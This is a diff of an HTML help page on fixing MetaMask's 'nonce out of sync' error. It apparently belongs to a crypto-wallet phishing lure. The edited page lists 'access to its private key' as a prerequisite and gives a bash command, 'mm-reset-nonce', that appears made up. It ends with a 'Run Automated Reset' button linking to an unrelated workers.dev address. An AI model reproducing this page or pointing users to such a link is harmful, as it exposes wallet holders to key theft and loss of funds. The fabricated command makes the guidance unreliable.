@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message stating "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network, indicating a discrepancy between the expected and actual transaction count.</li>
+<li>The user encounters a "Nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating a discrepancy between the expected and actual transaction count.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from interrupted or failed transactions.</li>
+<li>This error occurs when MetaMask's understanding of the user's transaction count (nonce) does not match the nonce recorded on the Ethereum blockchain, often due to pending transactions or transactions that have been sent but not yet confirmed.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resynchronize the nonce value</li>
-<li>Manually increment the nonce value in the transaction settings</li>
-<li>Use the following code to reset the nonce value:</li>
+<li>Reset the account in MetaMask to resync the nonce with the blockchain state.</li>
+<li>Use the Ethereum blockchain explorer to verify the current nonce and manually adjust it in MetaMask if necessary.</li>
+<li>Employ the following command in a bash terminal to reset the MetaMask nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="o">({</span>from:<span class="w"> </span><span class="s1">&#39;0x...your_address...&#39;</span>,<span class="w"> </span>to:<span class="w"> </span><span class="s1">&#39;0x...your_address...&#39;</span>,<span class="w"> </span>value:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>gas:<span class="w"> </span><span class="m">20000</span>,<span class="w"> </span>gasPrice:<span class="w"> </span><span class="m">20000000000</span>,<span class="w"> </span>nonce:<span class="w"> </span>eth_getTransactionCount<span class="o">(</span><span class="s1">&#39;0x...your_address...&#39;</span><span class="o">)})</span>
+<div class="codehilite"><pre><span></span><code>mm-reset-nonce<span class="w"> </span>--account<span class="w"> </span>&lt;account_address&gt;<span class="w"> </span>--nonce<span class="w"> </span>&lt;new_nonce_value&gt;
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and transaction management.</p>
+<p>Consider utilizing an external console for more complex nonce management tasks.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum account with sufficient balance</li>
-<li>Basic understanding of Ethereum transactions and nonce values</li>
+<li>MetaMask extension installed and configured.</li>
+<li>Ethereum account with a known address and access to its private key.</li>
+<li>Basic understanding of Ethereum transaction nonces and their role in transaction sequencing.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
